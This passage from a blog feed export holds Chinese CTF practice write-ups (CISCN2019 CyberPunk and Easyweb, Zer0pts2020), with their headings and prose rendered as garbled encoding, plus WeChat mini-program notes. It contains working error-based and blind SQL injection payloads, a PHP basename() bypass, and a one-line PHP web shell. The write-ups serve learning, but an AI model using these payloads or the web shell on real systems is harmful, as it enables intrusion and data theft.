punctuation">(</span>url<span class="token operator">=</span>url_log<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">changepwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'oldpass'</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">'newpass'</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    kk <span class="token operator">=</span> r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url_change<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'XPATH'</span> <span class="token keyword">in</span> kk<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>kk<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    <span class="token comment">#æ­£åº</span>    <span class="token comment">#paylaod = pre + "||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + suf</span>    <span class="token comment">#é€†åº</span>    paylaod <span class="token operator">=</span> pre <span class="token operator">+</span> <span class="token string">"||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('"</span> <span class="token operator">+</span> i <span class="token operator">+</span> suf    register<span class="token punctuation">(</span>paylaod<span class="token punctuation">)</span>    login<span class="token punctuation">(</span>paylaod<span class="token punctuation">)</span>    changepwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#æ­£åºpayload</span><span class="token comment">#paylaod = pre + "||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + "'))),1))#"</span><span class="token comment">#é€†åºpayload</span><span class="token comment">#paylaod = pre + "||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + "')))),1))#"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> é”™æ˜¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</title>
      <link href="/p/2589587575.html"/>
      <url>/p/2589587575.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[cyberpunk|2077]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/image-20210705163753559.png"></p><p>åˆæ˜¯ä¸€é“ä¸€å¹´å‰åšè¿‡çš„é¢˜ï¼Œç¿»äº†ç¿»å½“æ—¶çš„ç¬”è®°ï¼ŒæŠ˜è…¾äº†å¾ˆä¹…ï¼Œæ²¡åšå‡ºæ¥ã€‚</p><p>çœ‹äº†çœ‹wpï¼Œæ‰çŸ¥é“flagåœ¨/flag.txtä¸‹é¢ï¼Œä¹‹å‰ä¸€ç›´åœ¨ç”¨é”™æ˜¾çˆ†æ•°æ®åº“</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><h3 id="1-æ–‡ä»¶åŒ…å«"><a href="#1-æ–‡ä»¶åŒ…å«" class="headerlink" title="1.æ–‡ä»¶åŒ…å«"></a>1.æ–‡ä»¶åŒ…å«</h3><p>é¦–å…ˆåœ¨æ³¨é‡Šé‡Œå‘ç°<code>&lt;!--?file=?--&gt;</code>ï¼Œæ–‡ä»¶åŒ…å«ä¸‹ï¼ŒåŠ ä¸Šä¼ªåè®®ï¼ŒæŠŠå‡ ä¸ªæ–‡ä»¶æºç çˆ†å‡ºæ¥ï¼Œæ…¢æ…¢çœ‹ã€‚</p><p>è¿‡æ»¤çš„å¾ˆæ­»ï¼Œä½†åœ¨change.phpé‡Œæ²¡æœ‰å¯¹addressè¿›è¡Œæ­£åˆ™æ£€æµ‹ï¼Œsqlè¯­å¥é‡Œè¿˜å¯¹<code>æ—§address</code>è¿›è¡ŒæŸ¥è¯¢ï¼Œæ‰€ä»¥æ¼æ´å°±å‡ºåœ¨è¿™ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update `user` set `address`='"</span> <span class="token operator">.</span> <span class="token variable">$address</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"', `old_address`='"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'address'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"' where `user_id`="</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é€»è¾‘æ¢³ç†ï¼šaddressæ‰“å…¥æ³¨å…¥ä»£ç =&gt;ç¬¬äºŒæ¬¡æ­£å¸¸è¿è¡Œè§¦å‘æ³¨å…¥ä»£ç </p><h3 id="2-SQLæ³¨å…¥"><a href="#2-SQLæ³¨å…¥" class="headerlink" title="2.SQLæ³¨å…¥"></a>2.SQLæ³¨å…¥</h3><p>å› ä¸ºæœ‰<code> print_r($db-&gt;error);</code>,æ‰€ä»¥é”™æ˜¾è¯»å–flagï¼Œè‡³äºæ€ä¹ˆçŸ¥é“flagåœ¨/flag.txtï¼Œæš‚æ—¶ä¸æ˜</p><p>payloadï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&amp;</span>address<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select substr(load_file('</span><span class="token operator">/</span>flag<span class="token punctuation">.</span>txt'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&amp;</span>address<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select substr(load_file('</span><span class="token operator">/</span>flag<span class="token punctuation">.</span>txt'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸€ä¸ªè´¦æˆ·æ‰§è¡Œæ‰§è¡Œä¸€ä¸ªpayloadï¼Œå› ä¸ºä¹‹å‰æ‰“å…¥çš„æ³¨å…¥ä»£ç ç ´åäº†æ­£å¸¸é€»è¾‘ï¼Œå¯¼è‡´æ— æ³•æ­£å¸¸æ›´æ–°æ•°æ®ï¼Œæ‰€ä»¥æ³¨å…¥ä»£ç å°±ä¸€ç›´æ˜¯åŒä¸€å¥ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> é”™æ˜¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[Zer0pts2020]Can you guess it?</title>
      <link href="/p/2231722754.html"/>
      <url>/p/2231722754.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®è¯ï¼š[guess|basename|æ­£åˆ™]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Zer0pts2020-Can-you-guess-it/image-20210705134313605.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">;</span> <span class="token comment">// FLAG is defined in config.php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"I don't know what you are thinking, but I won't let you read it :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token variable">$guess</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Congratulations! The flag is: '</span> <span class="token operator">.</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Wrong.'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é¢˜éš¾ï¼Œæˆ‘æ•´ä¸æ¥ã€‚</p><p>ç¿»ç¿»wpï¼Œæ‰çŸ¥é“éšæœºæ•°é‚£æ˜¯ä¸ªé™·é˜±ã€‚</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><h3 id="basename-å‡½æ•°æ¼æ´"><a href="#basename-å‡½æ•°æ¼æ´" class="headerlink" title="basename()å‡½æ•°æ¼æ´"></a>basename()å‡½æ•°æ¼æ´</h3><h4 id="æ¼æ´1"><a href="#æ¼æ´1" class="headerlink" title="æ¼æ´1"></a>æ¼æ´1</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">basename</span><span class="token punctuation">(</span><span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">/</span>config<span class="token operator">.</span>php<span class="token punctuation">)</span> <span class="token operator">=></span>è¿”å›config<span class="token operator">.</span>phpï¼Œä½†è®¿é—®çš„è¿˜æ˜¯index<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœæ²¡æœ‰æ­£åˆ™ï¼Œå°±å¯ä»¥<code>/index.php/config.php?source</code>æ¥è¯»å–flagï¼šè®¿é—®çš„index.phpï¼Œæ˜¾ç¤ºçš„ç¡®å®config.phpå†…å®¹ã€‚</p><p>æ‰€ä»¥æ¥ä¸‹æ¥è¦è€ƒè™‘ç»•è¿‡æ­£åˆ™ã€‚</p><h4 id="æ¼æ´2"><a href="#æ¼æ´2" class="headerlink" title="æ¼æ´2"></a>æ¼æ´2</h4><p><code>basename()</code>å»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼:<a href="https://bugs.php.net/bug.php?id=62119">https://bugs.php.net/bug.php?id=62119</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xffconfig.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// => config.php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"config.php/xff"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// => config.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>äºæ˜¯æ„é€ payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">index<span class="token operator">.</span>php<span class="token operator">/</span>config<span class="token operator">.</span>php<span class="token operator">/</span><span class="token operator">%</span>ff<span class="token operator">?</span>source<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ ·çš„è¯ï¼Œç†ä¸‹é€»è¾‘ï¼š</p><p><code>$_SERVER[&#39;PHP_SELF&#39;]</code>=<code>index.php/config.php/ï¿½</code>ï¼Œç»•è¿‡äº†æ­£åˆ™ã€‚</p><p><code>basename</code>å‡½æ•°è¿”å›å€¼=<code>config.php</code>ï¼Œè®¿é—®çš„è¿˜æ˜¯index.phpï¼Œè¯»çš„æ˜¯config.phpã€‚</p><p>ç»“æŸã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
            <tag> basename </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</title>
      <link href="/p/1768082624.html"/>
      <url>/p/1768082624.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç€å®æƒ­æ„§ï¼Œè¿™é¢˜ä¸€å¹´å‰è¿˜åšè¿‡ï¼Œä»Šå¤©å†åšï¼Œå¾—ï¼Œå¿˜å¾—ä¸€å¹²äºŒå‡€ã€‚</p><p>å†™å¥½çš„è„šæœ¬ä¸€æ‰“å¼€ï¼Œpayloadéƒ½æ˜¯åŸå°ä¸åŠ¨äº†ï¼Œå°´å°¬ã€‚</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Easyweb-CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1/image-20210704234624409.png"></p><p>æˆªä¸ªå›¾ï¼Œå†™ä¸ªå…³é”®å­—ï¼Œæ–¹ä¾¿æ—¥åæ£€ç´¢ï¼š[çŒ«å›¾|çŒ«å¤´|çŒ«çŒ«]</p><p>è¿™é¢˜ä¸»è¦ä¸‰ä¸ªè€ƒç‚¹ï¼š1.å¤‡ä»½æ–‡ä»¶æ³„æ¼ï¼›2.SQLç›²æ³¨ï¼›3.æ–‡ä»¶ä¸Šä¼ </p><h3 id="1-å¤‡ä»½æ–‡ä»¶æ³„æ¼"><a href="#1-å¤‡ä»½æ–‡ä»¶æ³„æ¼" class="headerlink" title="1.å¤‡ä»½æ–‡ä»¶æ³„æ¼"></a>1.å¤‡ä»½æ–‡ä»¶æ³„æ¼</h3><p>æ‰«ä¸‹ç›®å½•ï¼Œæœ‰robots.txt</p><p>æç¤ºæ˜¯*.php.bak</p><p>æ‰«åˆ°æ˜¯/image.php.bak</p><h3 id="2-SQLç›²æ³¨"><a href="#2-SQLç›²æ³¨" class="headerlink" title="2.SQLç›²æ³¨"></a>2.SQLç›²æ³¨</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"%00"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åƒè¿™ç§å•å¼•å·+è½¬ä¹‰å•å¼•å·éƒ½è¢«è¿‡æ»¤ï¼Œç„¶ååˆæœ‰è¿‡æ»¤å…¶ä»–å­—ç¬¦æƒ…å†µä¸‹ã€‚å¯ä»¥è€ƒè™‘å¥—å¨ƒè½¬ä¹‰ã€‚<br>æ¯”å¦‚<code>\0</code>è¢«è¾“å…¥åˆ°å­—ç¬¦ä¸²ä¸­ï¼Œ<code>addslashes()</code>æ·»åŠ åæ–œæ å˜æˆ<code>\\0</code>,åˆä¼šè¢«<code>str_replace()</code>è½¬ä¹‰æˆ<code>\</code>ï¼Œè¿™æ ·å°±æ„é€ æˆ<code>\&#39;</code>ï¼Œå°±èƒ½æŠŠå•å¼•å·è½¬ä¹‰äº†ã€‚</p><p>æ³¨æ„ï¼Œåœ¨è¾“å…¥çš„æ—¶å€™è¿˜å¾—æŠŠ<code>\0</code>è½¬ä¹‰ï¼Œæ‰€ä»¥æ˜¯<code>?id=\\0</code></p><p>è¿™æ ·çœ‹å¤ªæŠ½è±¡ï¼Œæˆ‘è¿˜ç¢ç£¨äº†å¥½ä¹…ï¼Œæ‰”åˆ°navicatä¸€ä¸‹å°±æ˜ç™½äº†ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Easyweb-CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1/image-20210705000044013.png"></p><p>ç„¶åæµ‹è¯•ä¸€æ³¢payload,ææ¸…æ¥šç›²æ³¨é€»è¾‘ï¼Œå¥—åˆ°è„šæœ¬é‡Œè·‘ï¼Œæ‹¿åˆ°adminçš„å¯†ç (æ— éœ€è§£md5ã€‚è¿™é¢˜ä¸çŸ¥é“ä¸ºä»€ä¹ˆè·‘èµ·æ¥çœŸçš„æ…¢</p><h3 id="3-æ–‡ä»¶ä¸Šä¼ "><a href="#3-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="3.æ–‡ä»¶ä¸Šä¼ "></a>3.æ–‡ä»¶ä¸Šä¼ </h3><p>æ¼æ´åœ¨æ–‡ä»¶åå¤„ï¼Œä¼šå°†æ–‡ä»¶åå†™å…¥åˆ°log.phpé‡Œï¼Œåˆå› ä¸ºæ£€æµ‹phpå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¸€å¥è¯æœ¨é©¬ç”¨çŸ­æ ‡ç­¾</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> if+substrç›²æ³¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¾®ä¿¡å°ç¨‹åºå­¦ä¹ ç¬”è®°</title>
      <link href="/p/4251616546.html"/>
      <url>/p/4251616546.html</url>
      
        <content type="html"><![CDATA[<h2 id="åŸºç¡€æ¦‚å¿µ"><a href="#åŸºç¡€æ¦‚å¿µ" class="headerlink" title="åŸºç¡€æ¦‚å¿µ"></a>åŸºç¡€æ¦‚å¿µ</h2><ul><li><p>æ•°æ®é©±åŠ¨<br>å°†å·®å¼‚åº”ç”¨åˆ°Domæ ‘ä¸Šï¼Œè¾¾åˆ°æ›´æ–°UIçš„ç›®çš„ï¼Œæ„å‘³ç€åªæœ‰â€œä¿®æ”¹â€çš„ç›¸å…³å±æ€§æ‰ä¼šåˆ·æ–°ï¼Œè€Œæ²¡æœ‰å˜åŒ–çš„å°±ä¸åŠ¨ï¼Œé¿å…äº†å°éƒ¨åˆ†å­—èŠ‚ä¿®æ”¹å¯¼è‡´å…¨å±€é¡µé¢éƒ½å¾—åˆ·æ–°ä¸€éçš„æƒ…å†µã€‚</p></li><li><p>onLoad=&gt;onShow=&gt;onReadyã€‚</p></li><li><p>ä¸è¦æŠŠdataä¸­çš„ä»»æ„ä¸€é¡¹çš„valueè®¾ä¸ºundefinedï¼Œå¦åˆ™å¯èƒ½ä¼šæœ‰å¼•èµ·ä¸€äº›ä¸å¯é¢„æ–™çš„bug</p></li><li><p>currentTargetä¸ºå½“å‰äº‹ä»¶æ‰€ç»‘å®šçš„ç»„ä»¶ï¼Œè€Œtargetåˆ™æ˜¯è§¦å‘è¯¥äº‹ä»¶çš„æºå¤´ç»„ä»¶</p></li><li><p>äº‹ä»¶è§¦å‘é¡ºåº:handleTap2ã€handleTap4ã€handleTap3ã€handleTap1<br>å…ˆæ•è·(ä»å¤–åˆ°å†…)ï¼Œåå†’æ³¡(ä»å†…åˆ°å¤–<br><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210206182851994_22689.png"></p><blockquote><p>bindäº‹ä»¶ç»‘å®šä¸ä¼šé˜»æ­¢å†’æ³¡äº‹ä»¶å‘ä¸Šå†’æ³¡ï¼Œcatchäº‹ä»¶ç»‘å®šå¯ä»¥é˜»æ­¢å†’æ³¡äº‹ä»¶å‘ä¸Šå†’æ³¡ã€‚å¦‚æœå°†ä¸Šé¢ä»£ç ä¸­çš„ç¬¬ä¸€ä¸ªcapture-bindæ”¹ä¸ºcapture-catchï¼Œå°†åªè§¦å‘handleTap2(capture-catchå°†ä¸­æ–­æ•è·é˜¶æ®µå’Œå–æ¶ˆå†’æ³¡é˜¶æ®µ)</p></blockquote><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span>  <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">bind:</span>touchstart</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>handleTap1<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">capture-bind:</span>touchstart</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>handleTap2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  outer view  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span>    <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">bind:</span>touchstart</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>handleTap3<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">capture-bind:</span>touchstart</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>handleTap4<span class="token punctuation">"</span></span>  <span class="token punctuation">></span></span>    inner view  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>hover-classå±æ€§å¯æ”¹å˜è§¦æ‘¸æ—¶çš„æ ·å¼</p></li><li><p>ä¸ºé˜²æ­¢ç”¨æˆ·æå¿«é€Ÿåº¦è§¦å‘ä¸¤æ¬¡tapå›è°ƒï¼Œå¯è®¾ä¸ªå˜é‡å¦‚hasClickå½“ä½œçŠ¶æ€é”</p></li><li><p>é¢„å…ˆå±•ç¤ºçš„ï¼Œå¦‚å¹¿å‘Šã€å¯¼èˆªæ ã€å¤§ä½“æ¡†æ¶å¯åˆ©ç”¨<strong>åˆå§‹æ¸²æŸ“ç¼“å­˜</strong></p></li><li><p><strong>åŒå‘ç»‘å®š</strong><br><code>&lt;input model:value=&quot;&#123;&#123;value&#125;&#125;&quot; /&gt;</code>é¡µé¢ä¿®æ”¹äº†å€¼åå°ä¹Ÿä¼šæ”¹ï¼Œå¯ä»¥å‡å°‘ç»‘å®šformä¼ å€¼é—®é¢˜äº†ã€‚</p><h2 id="å€¼å¾—æ³¨æ„çš„å°é—®é¢˜"><a href="#å€¼å¾—æ³¨æ„çš„å°é—®é¢˜" class="headerlink" title="å€¼å¾—æ³¨æ„çš„å°é—®é¢˜"></a>å€¼å¾—æ³¨æ„çš„å°é—®é¢˜</h2></li></ul><h3 id="å—çº§æ ‡ç­¾å’Œå†…è”æ ‡ç­¾"><a href="#å—çº§æ ‡ç­¾å’Œå†…è”æ ‡ç­¾" class="headerlink" title="å—çº§æ ‡ç­¾å’Œå†…è”æ ‡ç­¾"></a>å—çº§æ ‡ç­¾å’Œå†…è”æ ‡ç­¾</h3><ul><li>å—çº§æ ‡ç­¾-è¡Œå…ƒç´ <blockquote><p>è‡ªå¸¦æ¢è¡Œ<br><code>&lt;h1-h6&gt;&lt;/h1-h6&gt;ï¼Œ&lt;p&gt;&lt;/p&gt;ï¼Œ&lt;div&gt;&lt;/div&gt;</code></p></blockquote></li><li>å†…è”æ ‡ç­¾-å†…è”æ ‡ç­¾<blockquote><p>å¤„äºä¸€è¡Œ<br><code>&lt;span&gt;&lt;/span&gt;ï¼Œ&lt;a&gt;&lt;/a&gt;ï¼Œ&lt;img/&gt;</code></p></blockquote></li></ul><p>1.ä¸Šä¸‹è¾¹è·è®¾ç½®æ— æ•ˆ<br>2.æ²¡æœ‰å®½åº¦å’Œé«˜åº¦<br>3.ä¸ä¼šå æ®å¤šä½™é¢ç§¯<br>4.imgæ ‡ç­¾å’Œå—çº§æ ‡ç­¾ä¸€æ ·ï¼Œæœ‰è¾¹è·å’Œå®½é«˜ï¼æ‰€ä»¥imgæ ‡ç­¾åˆå«è¡Œå†…å—çº§æ ‡ç­¾</p><ul><li><p>text-alignå¯¹äºè¡Œå†…å…ƒç´ å’Œè¡Œå†…å—çº§å…ƒç´ å¯èƒ½æ— æ•ˆ<br>åŸå› 